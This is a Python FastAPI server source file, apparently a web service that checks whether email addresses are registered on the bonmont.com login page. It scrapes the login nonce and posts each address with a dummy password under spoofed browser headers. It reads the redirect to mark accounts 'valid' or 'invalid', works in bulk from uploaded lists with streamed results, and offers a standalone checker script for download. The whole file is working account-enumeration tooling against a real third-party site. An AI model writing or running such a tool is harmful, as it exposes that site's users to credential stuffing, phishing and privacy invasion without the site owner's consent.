import json
from fastapi import FastAPI, APIRouter, UploadFile, File
from fastapi.responses import FileResponse, StreamingResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import csv
import io
import re
import asyncio
import aiohttp
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

app = FastAPI()
api_router = APIRouter(prefix="/api")

# Bonmont checker config
TARGET_URL = "https://bonmont.com/connexion/"
INVALID_MARKER = "opinions-login-error=invalid_email"
DUMMY_PASSWORD = "check123"
BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Referer": "https://bonmont.com/connexion/",
    "Origin": "https://bonmont.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
}

logger = logging.getLogger(__name__)


# Models
class EmailCheckRequest(BaseModel):
    email: str

class EmailCheckResult(BaseModel):
    email: str
    status: str
    detail: Optional[str] = None

class BatchCheckRequest(BaseModel):
    emails: List[str]
    concurrency: int = 5
    delay: float = 0.5


async def extract_nonce(session: aiohttp.ClientSession) -> tuple:
    """Extract WordPress nonce from the login page."""
    try:
        async with session.get(TARGET_URL, headers=BROWSER_HEADERS,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            body = await resp.text()
            nonce_match = re.search(r'id="opinions-login-nonce"[^>]*value="([^"]+)"', body)
            referer_match = re.search(r'name="_wp_http_referer"[^>]*value="([^"]+)"', body)
            nonce = nonce_match.group(1) if nonce_match else ""
            referer = referer_match.group(1) if referer_match else "/connexion/"
            return nonce, referer
    except Exception:
        return "", "/connexion/"


async def check_email_on_bonmont(session: aiohttp.ClientSession, email: str, nonce: str, referer: str, retries: int = 3) -> dict:
    """Check a single email against bonmont.com login form."""
    for attempt in range(retries):
        try:
            form_data = {
                "opinions_login[email]": email.strip(),
                "opinions_login[password]": DUMMY_PASSWORD,
                "opinions_login[submit]": "Se connecter",
                "opinions-login-nonce": nonce,
                "_wp_http_referer": referer,
            }
            async with session.post(
                TARGET_URL,
                data=form_data,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=15),
                headers=BROWSER_HEADERS,
            ) as resp:
                location = resp.headers.get("Location", "")
                # If redirect contains invalid_email marker → email not registered
                if INVALID_MARKER in location:
                    return {"email": email, "status": "invalid"}
                # Any other redirect → email exists (wrong password error)
                if resp.status in (301, 302, 303, 307, 308):
                    return {"email": email, "status": "valid"}
                # No redirect (200), check body
                body = await resp.text()
                if INVALID_MARKER in body:
                    return {"email": email, "status": "invalid"}
                # 200 without marker - likely nonce expired or email valid
                return {"email": email, "status": "valid"}
        except asyncio.TimeoutError:
            if attempt == retries - 1:
                return {"email": email, "status": "error", "detail": "timeout"}
            await asyncio.sleep(1)
        except Exception as e:
            if attempt == retries - 1:
                return {"email": email, "status": "error", "detail": str(e)[:100]}
            await asyncio.sleep(1)
    return {"email": email, "status": "error", "detail": "max retries"}


def parse_emails_from_text(text: str, filename: str = "") -> List[str]:
    """Parse emails from text content (CSV or plain text)."""
    emails = []
    if filename.lower().endswith('.csv'):
        reader = csv.reader(io.StringIO(text))
        for row in reader:
            if row:
                email = row[0].strip()
                if '@' in email and email.lower() != 'email':
                    emails.append(email)
    else:
        for line in text.splitlines():
            email = line.strip()
            if email and '@' in email:
                emails.append(email)
    return list(dict.fromkeys(emails))  # deduplicate preserving order


@api_router.get("/")
async def root():
    return {"message": "Bonmont Email Checker API"}


@api_router.post("/check-email", response_model=EmailCheckResult)
async def check_single_email(req: EmailCheckRequest):
    """Check a single email against bonmont.com."""
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        nonce, referer = await extract_nonce(session)
        result = await check_email_on_bonmont(session, req.email, nonce, referer)
        return EmailCheckResult(**result)


@api_router.post("/check-emails")
async def check_batch_emails(req: BatchCheckRequest):
    """Check a batch of emails."""
    semaphore = asyncio.Semaphore(req.concurrency)
    connector = aiohttp.TCPConnector(limit=req.concurrency, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        nonce, referer = await extract_nonce(session)

        async def check_with_sem(email):
            async with semaphore:
                return await check_email_on_bonmont(session, email, nonce, referer)

        tasks = []
        for i, email in enumerate(req.emails):
            tasks.append(asyncio.create_task(check_with_sem(email)))
            if (i + 1) % req.concurrency == 0:
                await asyncio.sleep(req.delay)

        results = await asyncio.gather(*tasks)

    return {"total": len(results), "results": results}


@api_router.post("/check-emails-file")
async def check_emails_file(file: UploadFile = File(...)):
    """Check emails from an uploaded file."""
    content = await file.read()
    text = content.decode("utf-8", errors="ignore")
    emails = parse_emails_from_text(text, file.filename or "")

    if not emails:
        return {"error": "Aucun email valide trouvé dans le fichier", "total": 0, "results": []}

    semaphore = asyncio.Semaphore(5)
    connector = aiohttp.TCPConnector(limit=5, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        nonce, referer = await extract_nonce(session)

        async def check_with_sem(email):
            async with semaphore:
                return await check_email_on_bonmont(session, email, nonce, referer)

        tasks = []
        for i, email in enumerate(emails):
            tasks.append(asyncio.create_task(check_with_sem(email)))
            if (i + 1) % 5 == 0:
                await asyncio.sleep(0.5)

        results = await asyncio.gather(*tasks)

    return {"total": len(results), "results": results}


@api_router.get("/checker-script")
async def get_checker_script():
    """Download the standalone checker.py script."""
    script_path = ROOT_DIR / "checker.py"
    if script_path.exists():
        return FileResponse(script_path, media_type="text/x-python", filename="checker.py")
    return {"error": "Script not found"}

@api_router.post("/check-emails-stream")
async def check_emails_stream(file: UploadFile = File(...)):
    """Stream email check results in real-time via SSE."""
    content = await file.read()
    text = content.decode("utf-8", errors="ignore")
    emails = parse_emails_from_text(text, file.filename or "")

    if not emails:
        async def empty_stream():
            yield f"data: {json.dumps({'type': 'error', 'message': 'Aucun email valide trouve'})}\n\n"
        return StreamingResponse(empty_stream(), media_type="text/event-stream")

    total = len(emails)

    async def event_stream():
        yield f"data: {json.dumps({'type': 'start', 'total': total})}\n\n"

        connector = aiohttp.TCPConnector(limit=5, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            nonce, referer = await extract_nonce(session)
            processed = 0

            # Process in batches of 5 with delay
            batch_size = 5
            for batch_start in range(0, total, batch_size):
                batch = emails[batch_start:batch_start + batch_size]
                tasks = [check_email_on_bonmont(session, e, nonce, referer) for e in batch]
                batch_results = await asyncio.gather(*tasks)

                for result in batch_results:
                    processed += 1
                    progress = round(processed / total * 100, 1)
                    yield f"data: {json.dumps({'type': 'result', 'result': result, 'processed': processed, 'total': total, 'progress': progress})}\n\n"

                if batch_start + batch_size < total:
                    await asyncio.sleep(0.5)

        yield f"data: {json.dumps({'type': 'complete', 'total': total})}\n\n"

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        }
    )




# Include router
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
